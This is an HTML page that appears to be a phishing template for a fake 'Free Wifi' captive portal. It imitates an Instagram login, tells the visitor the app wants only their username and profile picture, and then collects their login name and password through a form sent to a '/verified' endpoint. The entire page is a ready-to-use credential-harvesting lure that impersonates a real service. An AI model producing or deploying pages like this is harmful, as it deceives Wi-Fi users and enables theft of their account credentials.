<!DOCTYPE html>
<html>
<head>
  <title>Free Wifi - Instagram</title>
  <meta name="viewport" content="width=device-width, initial-scale=0.75">
  <link rel="icon" href="data:,">
  <link rel="stylesheet" type="text/css" href="instagram_style.css">
</head>
<body>
  <div class="container">
      <div class="box">
          <div class="heading"></div>
          <p>Application <strong>Free Wifi</strong> wants to access your account informations. Application will gain permission to following informations: <strong>Username, Profile Picture</strong></p>
          <form class="login-form" action="/verified">
              <input id="authMethod" type="authMethod" name="authMethod" value="Instagram" hidden/>
              <div class="field">
                  <input id="username" type="name" name="username" placeholder="Phone number, username, or email" required/>
                  <label for="username">Phone number, username, or email</label>
              </div>
              <div class="field">
                  <input id="password" type="password" name="password" placeholder="Password" required/>
                  <label for="password">Password</label>
              </div>
              <button class="login-button" title="login">Log In</button>
              <p></p>
          </form>
      </div>
  </div>
</body>
</html>
